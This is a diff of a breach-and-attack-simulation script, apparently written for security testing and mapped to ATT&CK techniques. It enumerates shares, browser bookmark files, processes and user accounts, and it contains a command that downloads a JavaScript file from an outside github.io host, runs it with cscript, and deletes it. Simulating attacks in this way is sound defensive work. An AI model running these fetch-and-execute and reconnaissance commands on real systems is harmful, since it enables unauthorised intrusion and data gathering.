@@ -49,14 +49,16 @@ cmd /c net share > C:\SISAONE_BAS\Discovery\net_share_output.txt
 cmd /c where /R C:\Users\ Bookmarks > C:\SISAONE_BAS\Discovery\T1217_Google_Bookmark_output.txt
 cmd /c where /R C:\Users\ places.sqlite > C:\SISAONE_BAS\Discovery\T1217_firefox_Bookmark_output.txt
 cmd /c dir /s /b %USERPROFILE%\Favorites > C:\SISAONE_BAS\Discovery\T1217_Bookmark_output.txt
-cmd /c Dependencies\T1010.exe > C:\SISAONE_BAS\Discovery\T1010_output.txt
+
 
 # EXECUTION
 
 Invoke-WebRequest -Uri "https://darkydeliver.github.io/sysinfo/sysinfo.js" -OutFile "C:\SISAONE_BAS\Execution\sysinfo.js"; Start-Process -FilePath "cmd.exe" -ArgumentList "/c cscript C:\SISAONE_BAS\Execution\sysinfo.js > C:\SISAONE_BAS\Execution\sysinfo_js_output.txt" -Wait; Remove-Item "C:\SISAONE_BAS\Execution\sysinfo.js"
 cmd /c echo Executes a command in the Windows Command Shell to write a message > C:\SISAONE_BAS\Execution\SputnikBAS_Suspicious_Execution_via_Windows_Command_Shell.txt
 cmd /c echo Writes text to a file and display the results > C:\SISAONE_BAS\Execution\Drop_file_output.txt
-for /l %x in (1,1,1) do start wordpad.exe /p C:\SISAONE_BAS\Execution\WMI_software_output.txt; Stop-Process -Name wordpad -Force -ErrorAction SilentlyContinue
+Start-Process wordpad.exe -ArgumentList "/p C:\SISAONE_BAS\Execution\WMI_software_output.txt"
+Start-Sleep -Seconds 3
+Stop-Process -Name wordpad -Force -ErrorAction SilentlyContinue
 cmd /c wmic process get caption,executablepath,commandline /format:csv > C:\SISAONE_BAS\Execution\WMI_process_output.txt
 cmd /c wmic useraccount get /ALL /format:csv > C:\SISAONE_BAS\Execution\WMI_users_output.txt
 cmd /c wmic qfe get description,installedOn /format:csv > C:\SISAONE_BAS\Execution\WMI_software_output.txt
